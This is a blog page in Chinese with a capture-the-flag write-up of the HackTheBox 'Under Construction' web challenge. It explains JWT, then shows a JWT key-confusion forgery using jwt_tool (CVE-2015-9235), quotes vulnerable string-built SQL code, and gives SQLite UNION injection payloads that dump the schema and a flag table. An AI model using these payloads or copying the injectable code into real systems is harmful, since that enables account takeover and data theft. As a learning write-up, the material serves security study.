@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Information  JWT介绍 JWT,JSON Web Token的缩写。在进行身份验证(Authorization)和信息交换(Information Exchange)是有用 JWT由三部分组成，之间用圆点连接，分别是Header,Payload,Signature,比较直观一点的JWT例子就是xxx.yyy.zzz  Header :由token类型和算法名称两部分组成，结构如下：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Under Constraction Challenge">
+<meta property="og:url" content="http://example.com/2022/08/04/htb-under-constraction/index.html">
+<meta property="og:site_name" content="a0dy&#39;s Home">
+<meta property="og:description" content="Information  JWT介绍 JWT,JSON Web Token的缩写。在进行身份验证(Authorization)和信息交换(Information Exchange)是有用 JWT由三部分组成，之间用圆点连接，分别是Header,Payload,Signature,比较直观一点的JWT例子就是xxx.yyy.zzz  Header :由token类型和算法名称两部分组成，结构如下：">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-08-04T13:05:00.000Z">
+<meta property="article:modified_time" content="2023-03-19T09:40:34.666Z">
+<meta property="article:author" content="Andy">
+<meta property="article:tag" content="SQL Injection">
+<meta property="article:tag" content="JWT">
+<meta property="article:tag" content="CVE-2015-9235">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>HTB Under Constraction Challenge</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/links/">Links</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/08/08/htb-support/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/08/04/htb-netmon/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/08/04/htb-under-constraction/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/08/04/htb-under-constraction/&text=HTB Under Constraction Challenge"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/08/04/htb-under-constraction/&title=HTB Under Constraction Challenge"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/08/04/htb-under-constraction/&is_video=false&description=HTB Under Constraction Challenge"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Under Constraction Challenge&body=Check out this article: http://example.com/2022/08/04/htb-under-constraction/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/08/04/htb-under-constraction/&title=HTB Under Constraction Challenge"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/08/04/htb-under-constraction/&title=HTB Under Constraction Challenge"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/08/04/htb-under-constraction/&title=HTB Under Constraction Challenge"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/08/04/htb-under-constraction/&title=HTB Under Constraction Challenge"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/08/04/htb-under-constraction/&name=HTB Under Constraction Challenge&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/08/04/htb-under-constraction/&t=HTB Under Constraction Challenge"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#information"><span class="toc-number">1.</span> <span class="toc-text"> Information</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jwt%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text"> JWT介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E7%BD%B2%E5%92%8C%E5%8A%A0%E5%AF%86"><span class="toc-number">1.2.</span> <span class="toc-text"> 签署和加密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#code-analyse"><span class="toc-number">2.</span> <span class="toc-text"> Code Analyse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95"><span class="toc-number">2.1.</span> <span class="toc-text"> 文件目录:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text"> 文件分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0public-key"><span class="toc-number">2.3.</span> <span class="toc-text"> 拿到Public Key</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">3.</span> <span class="toc-text"> Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E8%B4%A6%E6%88%B7%E5%AD%98%E5%9C%A8%E7%99%BB%E5%BD%95"><span class="toc-number">3.1.</span> <span class="toc-text"> 实现任意账户（存在）登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text"> SQL注入</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HTB Under Constraction Challenge
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Andy</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-08-04T13:05:00.000Z" itemprop="datePublished">2022-08-04</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WEB/">WEB</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/CVE-2015-9235/" rel="tag">CVE-2015-9235</a>, <a class="tag-link-link" href="/tags/JWT/" rel="tag">JWT</a>, <a class="tag-link-link" href="/tags/SQL-Injection/" rel="tag">SQL Injection</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="information"><a class="markdownIt-Anchor" href="#information"></a> Information</h2>
+<h3 id="jwt介绍"><a class="markdownIt-Anchor" href="#jwt介绍"></a> JWT介绍</h3>
+<p>JWT,JSON Web Token的缩写。在进行身份验证(Authorization)和信息交换(Information Exchange)是有用</p>
+<p>JWT由三部分组成，之间用圆点连接，分别是<code>Header</code>,<code>Payload</code>,<code>Signature</code>,比较直观一点的JWT例子就是xxx.yyy.zzz</p>
+<ul>
+<li>Header :由token类型和算法名称两部分组成，结构如下：(需要二次base64转码)</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    &#x27;alg&#x27;<span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">    &#x27;typ&#x27;<span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>Payload :关于实体和其他数据声明。声明有三种类型：registered、public、private</li>
+</ul>
+<p>最重要的是了解JWT是如何工作的：当用户用凭证进行成功登录后，JWT会返回一个token，之后就可以凭借这个token来请求服务了，但是问题就在于这个token对于时间周期是十分严格的，要保障安全，我们需要token保存的时间不超过我们需要用到token的时间。</p>
+<p>JWT和Session都是用户验证用户的身份，但是由于Session是基于服务端的，而JWT是基于客户端的，所以在请求时需要将获取到的JWT放到header中一起发送。</p>
+<ul>
+<li>JWT固定参数:</li>
+</ul>
+<p><code>iss</code> :发行人</p>
+<p><code>exp</code> :到期时间</p>
+<p><code>sub</code> :主题</p>
+<p><code>aud</code> :用户</p>
+<p><code>nbf</code> :在此之前不可用</p>
+<p><code>iat</code> :发布时间</p>
+<p><code>jti</code> :JWT ID标记</p>
+<h3 id="签署和加密"><a class="markdownIt-Anchor" href="#签署和加密"></a> 签署和加密</h3>
+<blockquote>
+<p>我从Oveflow上找到一下信息:</p>
+</blockquote>
+<ul>
+<li>
+<p>Signing:</p>
+<ul>
+<li>The private key is owned by the issuer and is used to compute the signature.</li>
+<li>The public key can be shared with all parties that need to verify the signature.</li>
+</ul>
+</li>
+<li>
+<p>Encryption:</p>
+<ul>
+<li>The private key is owned by the recipient and is used to decrypt the data.</li>
+<li>The public key can be shared to any party that want to send sensitive data to the recipient.</li>
+</ul>
+<p>简单来说就是签署只有服务提供方能够解密，而非对称加密需要你将你的公钥发放给需要给你发送加密文件的人，此后只有持有私钥的人才能对其进行解密</p>
+</li>
+</ul>
+<h2 id="code-analyse"><a class="markdownIt-Anchor" href="#code-analyse"></a> Code Analyse</h2>
+<p>访问给的URL,我们得到一样登录界面，尝试进行注册可以发现这个功能是正常可以使用的，但是我们进行登录后，观察到系统出现提示:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Message from developers </span><br><span class="line">Welcome admin</span><br><span class="line">This site is under development.</span><br><span class="line">Please come back later. </span><br></pre></td></tr></table></figure>
+<h3 id="文件目录"><a class="markdownIt-Anchor" href="#文件目录"></a> 文件目录:</h3>
+<p>首先进行文件审查，第一步我们要知道文件里面的东西是干什么的，一下为文件目录</p>
+<blockquote>
+<p>提前给好了目标IP和源码，只需要解压源码</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">d   4096 Feb 24  2020 helpers</span><br><span class="line">-    574 Feb 24  2020 index.js</span><br><span class="line">d   4096 Feb 24  2020 middleware</span><br><span class="line">d   4096 Aug  4 08:09 node_modules</span><br><span class="line">-    443 Feb 24  2020 package.json</span><br><span class="line">- 115733 Aug  4 08:09 package-lock.json</span><br><span class="line">d   4096 Feb 24  2020 routes</span><br><span class="line">d   4096 Aug  4 09:20 views</span><br></pre></td></tr></table></figure>
+<h3 id="文件分析"><a class="markdownIt-Anchor" href="#文件分析"></a> 文件分析</h3>
+<ul>
+<li>[d] helpers
+<ul>
+<li>DBhelper.js</li>
+</ul>
+<blockquote>
+<p>存在函数getUser、checkUser、createUser、attemptLogin，功能跟名字一样，这个库文件中在对数据库进行查询时并没有对输入参数进行筛查，所以可以初步判定目标是存在SQL注入漏洞的</p>
+</blockquote>
+<ul>
+<li>存在函数sign进行签名、decode进行解密</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">sign</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    data = <span class="title class_">Object</span>.<span class="title function_">assign</span>(data, &#123;<span class="attr">pk</span>:publicKey&#125;);</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">await</span> jwt.<span class="title function_">sign</span>(data, privateKey, &#123; <span class="attr">algorithm</span>:<span class="string">&#x27;RS256&#x27;</span> &#125;))</span><br><span class="line">&#125;,</span><br><span class="line"><span class="keyword">async</span> <span class="title function_">decode</span>(<span class="params">token</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">await</span> jwt.<span class="title function_">verify</span>(token, publicKey, &#123; <span class="attr">algorithms</span>: [<span class="string">&#x27;RS256&#x27;</span>, <span class="string">&#x27;HS256&#x27;</span>] &#125;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li>middleware\AuthMiddleware.js
+<blockquote>
+<p>是否登录进行验证，没有登录就重置url到/auth，存在JWT就进行解密获取到username</p>
+</blockquote>
+</li>
+<li>routes\index.js</li>
+<li>[d] views
+<blockquote>
+<p>前端页面</p>
+</blockquote>
+</li>
+<li>index.js
+<blockquote>
+<p>大概是部署脚本？</p>
+</blockquote>
+</li>
+<li>package.json
+<blockquote>
+<p>项目依赖</p>
+</blockquote>
+</li>
+</ul>
+<p><strong>PS:js代码不怎么会，只能看懂一部分，需要补充一下这部分的空缺了。。</strong></p>
+<h3 id="拿到public-key"><a class="markdownIt-Anchor" href="#拿到public-key"></a> 拿到Public Key</h3>
+<p>看完了代码，我觉得值得我留意的是Google<code>jsonwebtoken vulnerabilities</code>后得到的有记录的<code>CVE-2015-9235</code>:</p>
+<p>漏洞描述:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In jsonwebtoken node module before 4.2.2 it is possible for an attacker to bypass verification when a token digitally signed with an asymmetric key (RS/ES family) of algorithms but instead the attacker send a token digitally signed with a symmetric algorithm (HS* family).</span><br></pre></td></tr></table></figure>
+<p>在helpers目录下存在<code>JWThelper.js</code>,通过访问浏览器开发者工具，我在cookie一栏找到了<code>session</code>将其值在 <a target="_blank" rel="noopener" href="https://jwt.io/" title="JWT.IO allows you to decode, verify and generate JWT.">JWT.io</a>进行了解密,从payload中找到了Public Key:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY</span><br><span class="line">ktsbj1KxxUOozw0trP93BgIpXv6WipQRB5lqofPlU6FB99Jc5QZ0459t73ggVDQi</span><br><span class="line">XuCMI2hoUfJ1VmjNeWCrSrDUhokIFZEuCumehwwtUNuEv0ezC54ZTdEC5YSTAOzg</span><br><span class="line">jIWalsHj/ga5ZEDx3Ext0Mh5AEwbAD73+qXS/uCvhfajgpzHGd9OgNQU60LMf2mH</span><br><span class="line">+FynNsjNNwo5nRe7tR12Wb2YOCxw2vdamO1n1kf/SMypSKKvOgj5y0LGiU3jeXMx</span><br><span class="line">V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr</span><br><span class="line">0wIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>
+<h2 id="exploit"><a class="markdownIt-Anchor" href="#exploit"></a> Exploit</h2>
+<h3 id="实现任意账户存在登录"><a class="markdownIt-Anchor" href="#实现任意账户存在登录"></a> 实现任意账户（存在）登录</h3>
+<p>我在网上搜寻了一些关于jwt弱点的知识，得知了JWT confusion attack，由于jwt在进行非对称加密时，我们唯一能够得到的是服务器给我们的公钥，所以我们能够在配置有HS256对称密匙算法的目标机器上进行攻击，接下来就是对我们修改过的token利用公钥进行签名。</p>
+<p>我在GitHub上发现了一个专注于JWT的工具集<code>jwt_tools</code>,依据程序内置的帮助手册，我使用一下命令对token进行了修改和签名:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jwt_tool.py $(<span class="built_in">cat</span> jwt.txt) -X k -py public.key -I -pc username -py admin</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>jwt是我以test用户名注册的时候，本地签署的token值，<code>-X k</code> 密匙混淆攻击 模式,<code>-I</code>是更新claim（增加新的claim）<code>-pc</code>和<code>-py</code>分别是指示payload内元素名称和值</p>
+</blockquote>
+<p>运行以上命令后，我们得到了新的token，此后只需要修改-py后的内容我们就可以登录任意账户。</p>
+<h3 id="sql注入"><a class="markdownIt-Anchor" href="#sql注入"></a> SQL注入</h3>
+<p>一下我列出了后台处理用户名的关键代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="title class_">AuthMiddleware</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">let</span> user = <span class="keyword">await</span> <span class="title class_">DBHelper</span>.<span class="title function_">getUser</span>(req.<span class="property">data</span>.<span class="property">username</span>);</span><br><span class="line">        <span class="keyword">if</span> (user === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.<span class="title function_">send</span>(<span class="string">`user <span class="subst">$&#123;req.data.username&#125;</span> doesn&#x27;t exist in our database.`</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">render</span>(<span class="string">&#x27;index.html&#x27;</span>, &#123; user &#125;);</span><br><span class="line">    &#125;<span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">next</span>(err);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">getUser</span>(<span class="params">username</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">res, rej</span>) =&gt;</span> &#123;</span><br><span class="line">        db.<span class="title function_">get</span>(<span class="string">`SELECT * FROM users WHERE username = &#x27;<span class="subst">$&#123;username&#125;</span>&#x27;`</span>, <span class="function">(<span class="params">err, data</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (err) <span class="keyword">return</span> <span class="title function_">rej</span>(err);</span><br><span class="line">            <span class="title function_">res</span>(data);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
+<p>我要在<code>SELECT * FROM users WHERE username = '$&#123;username&#125;'</code>上下手，可以看出来，${username}是我可以操控的部分，不太熟悉SQL注入，接下来我进行了搜寻，但得到的反馈结果是<code>Error: SQLITE_ERROR: unrecognized token: &amp;quot;#&amp;quot;</code>，系统并不能正确地理解我的token，所以参考了 <a target="_blank" rel="noopener" href="https://www.tariqhawis.com/htb-under-construction-web-challange/">这篇文章</a></p>
+<p>对表单的列进行检索(用户名建议改用自己注册过的)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test<span class="string">&#x27; order by 10;--</span></span><br></pre></td></tr></table></figure>
+<p><code>--</code>符号用于对后面的语句进行注释</p>
+<blockquote>
+<p>sqlite的注释符号有<code>--</code>和<code>/*</code></p>
+</blockquote>
+<p>得到反馈<code>Error: SQLITE_ERROR: 1st ORDER BY term out of range - should be between 1 and 3</code>,说明数据库表单只有3个列</p>
+<p>由于只能显示用户名，所以我们的</p>
+<p>接着<code>test1' AND 1=0 UNION SELECT 1,(SELECT group_concat(sql) FROM sqlite_master),3;--</code></p>
+<p><code>AND 1=0</code> ：忽略了前面username = test的检索结果<br />
+<code>union</code> ：联合搜索结果<br />
+<code>group_concat()</code> ：可以将信息联合起来<br />
+<code>sqlite_master</code>是一个SQLite使用的系统表如下</p>
+<ul>
+<li>sqlite_master表单
+<ul>
+<li>type记录类型</li>
+<li>name记录项目名字</li>
+<li>tbl_name记录从属表名</li>
+<li>rootpage记录数据库页存储编号</li>
+<li>sql记录创建项目的sql语句</li>
+</ul>
+</li>
+</ul>
+<p>如此我们可以得到服务器以下反馈信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Welcome CREATE TABLE &amp;quot;flag_storage&amp;quot; (</span><br><span class="line">	&amp;quot;id&amp;quot;	INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class="line">	&amp;quot;top_secret_flaag&amp;quot;	TEXT</span><br><span class="line">),CREATE TABLE sqlite_sequence(name,seq),CREATE TABLE &amp;quot;users&amp;quot; (</span><br><span class="line">	&amp;quot;id&amp;quot;	INTEGER,</span><br><span class="line">	&amp;quot;username&amp;quot;	VARCHAR(255) NOT NULL,</span><br><span class="line">	&amp;quot;password&amp;quot;	VARCHAR(255) NOT NULL,</span><br><span class="line">	PRIMARY KEY(&amp;quot;id&amp;quot;)</span><br><span class="line">)&lt;br&gt;This site is under development. &lt;br&gt;</span><br><span class="line">Please come back later.</span><br></pre></td></tr></table></figure>
+<p>最后使用如下语句可以得到flag</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27; and 1=0 union select 1,(select top_secret_flaag from flag_storage),3;--</span></span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">categories</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#information"><span class="toc-number">1.</span> <span class="toc-text"> Information</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jwt%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text"> JWT介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E7%BD%B2%E5%92%8C%E5%8A%A0%E5%AF%86"><span class="toc-number">1.2.</span> <span class="toc-text"> 签署和加密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#code-analyse"><span class="toc-number">2.</span> <span class="toc-text"> Code Analyse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%9B%AE%E5%BD%95"><span class="toc-number">2.1.</span> <span class="toc-text"> 文件目录:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text"> 文件分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8B%BF%E5%88%B0public-key"><span class="toc-number">2.3.</span> <span class="toc-text"> 拿到Public Key</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exploit"><span class="toc-number">3.</span> <span class="toc-text"> Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E8%B4%A6%E6%88%B7%E5%AD%98%E5%9C%A8%E7%99%BB%E5%BD%95"><span class="toc-number">3.1.</span> <span class="toc-text"> 实现任意账户（存在）登录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text"> SQL注入</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/08/04/htb-under-constraction/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/08/04/htb-under-constraction/&text=HTB Under Constraction Challenge"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/08/04/htb-under-constraction/&title=HTB Under Constraction Challenge"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/08/04/htb-under-constraction/&is_video=false&description=HTB Under Constraction Challenge"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HTB Under Constraction Challenge&body=Check out this article: http://example.com/2022/08/04/htb-under-constraction/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/08/04/htb-under-constraction/&title=HTB Under Constraction Challenge"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/08/04/htb-under-constraction/&title=HTB Under Constraction Challenge"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/08/04/htb-under-constraction/&title=HTB Under Constraction Challenge"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
